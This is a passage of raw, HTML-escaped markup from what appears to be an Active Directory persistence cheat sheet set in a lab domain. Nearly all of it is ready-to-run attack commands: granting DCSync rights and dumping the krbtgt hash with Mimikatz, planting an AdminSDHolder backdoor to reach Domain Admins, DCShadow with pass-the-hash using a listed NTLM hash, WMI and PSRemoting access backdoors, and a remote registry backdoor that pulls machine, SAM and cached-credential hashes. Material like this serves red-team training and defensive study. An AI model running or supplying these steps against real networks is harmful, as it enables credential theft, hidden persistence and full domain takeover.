&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetDistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">DCSync&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-GUIDRight&lt;/span> &lt;span class="n">DCSync&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the rights have been correctly added:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;dc=cyberlab,dc=cybercorp,dc=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectType&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;replication&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">))}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>With replication rights the user can get the hash of &lt;em>krbtgt&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="adminsdholder">AdminSDHolder&lt;/h2>
&lt;p>With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the members of groups like Domain Admins without actually being a member of it.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Check AdminSDHolder permissions (as normal user):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Add &lt;strong>FullControl&lt;/strong> permissions for a user to the AdminSDHolder&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s1">&amp;#39;STUDENT1&amp;#39;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>but there are also other interesting permissions (&lt;strong>ResetPassword&lt;/strong>, &lt;strong>WriteMembers&lt;/strong>) for a user to the AdminSDHolder:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">ResetPassword&lt;/span> &lt;span class="n">-VerboseAdd-ObjectAcl&lt;/span> &lt;span class="n">-TargetADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">WriteMembers&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Run SDProp manually using Invoke-SDPropagator.ps1 (requires DA privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Pre-Server 2008 machines&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-SDPropagator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SDPropagator&lt;/span> &lt;span class="n">-taskname&lt;/span> &lt;span class="n">FixUpInheritance&lt;/span> &lt;span class="n">-timeoutMinutes&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-showProgress&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Server 2008 and beyond&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-SDPropagator&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-SDPropagator&lt;/span> &lt;span class="n">-timeoutMinutes&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB.LOCAL&amp;#34;&lt;/span> &lt;span class="n">-showProgress&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Verify the successful update of Domain Admins ACL (as normal user):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=Domain Admins,CN=Users,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Once you have the requested permissions on desired objects, it is possible to abuse FullControl/WriteMember (running as the user previousely added) to add new users to the Domain Admins group:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-DomainGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Members&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ADGroupMember&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-Members&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or perform ResetPassword (running as the user previousely added):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView_dev&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DomainUserPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-AccountPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">Force&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADAccountPassword&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;TESTDA&amp;#34;&lt;/span> &lt;span class="n">-NewPassword&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">ConvertTo-SecureString&lt;/span> &lt;span class="s2">&amp;#34;Password@123&amp;#34;&lt;/span> &lt;span class="n">-AsPlainText&lt;/span> &lt;span class="n">Force&lt;/span> &lt;span class="n">-Force&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="dcshadow">DCShadow&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Start a mimikatz session as SYSTEM and run the below commands to modify an attribute (in this case the SPN is set to “Replication/DC”:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /object:STUDENT2 /attribute:servicePrincipalName /value:&amp;#34;Replication/DC&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Then from mimikatz impersonate a Domain Admin and push the attributes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # sekurlsa::pth /user:Administrator /domain:cybercorp.local /ntlm:78603c228a04497e15e870688ea2e02d /impersonate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /push
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we would like to do the above without using DA, the only thing that changes is the “push”. Instead of running mimikatz as DA to push the attributes, we can use SetDCShadowPermissions to provide minimal rights to a user (STUDENT1) in order to change attributes to another user (STUDENT2). Keep in mind that, for once, we will still need to have DA privileges.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Run the below command from a PowerShell session running as DA:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Set-DCShadowPermissions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DCShadowPermissions&lt;/span> &lt;span class="n">-FakeDC&lt;/span> &lt;span class="s2">&amp;#34;fake-dc&amp;#34;&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Then as STUDENT1 run mimikatz and push the attributes:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcshadow /push
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>In order to remove the just provided permissions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Set-DCShadowPermissions&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-DCShadowPermissions&lt;/span> &lt;span class="n">-FakeDC&lt;/span> &lt;span class="s2">&amp;#34;fake-dc&amp;#34;&lt;/span> &lt;span class="n">-SamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT2&amp;#34;&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-Remove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)&lt;/h2>
&lt;p>ACLs can be modified to allow non-admin users access to securable objects.&lt;/p>
&lt;p>Allow access permission on local machine for STUDENT1 user:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow access permission on a remote machine for STUDENT1 without explicit credentials&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;DC&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow access permission on a remote machine with explicit credentials. Only root2 and nested namespaces:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remove access permission on a remote machine remove permissions :&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemoteWMI&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-namespace&lt;/span> &lt;span class="s2">&amp;#34;root\cimv2&amp;#34;&lt;/span> &lt;span class="n">-Remove&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="powershell-remoting">PowerShell Remoting&lt;/h2>
&lt;p>Allow PSRemoting access permission on local machine for STUDENT1:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Allow PSRemoting access permission on a remote machine for STUDENT1 without credentials:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Remove PSRemoting access permission on a remote machine for STUDENT1:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Nishang&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-RemotePSRemoting&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Remove&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="remote-registry">Remote Registry&lt;/h2>
&lt;p>Using DAMP, with admin privileges on a remote machine, it is possible to implement a new remote registry backdoor that allows for the remote retrieval of a system&amp;quot;s machine and local account hashes, as well as its domain cached credentials.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Add-RemoteRegBackdoor&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-RemoteRegBackdoor&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Trustee&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>As STUDENT1, abuse the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>The machine account hash for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteMachineAccountHash&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The local SAM account hashes for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteLocalAccountHash&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>The domain cached credentials for the specified machine:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># DAMP&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">RemoteHashRetrieval&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-RemoteCachedCredential&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
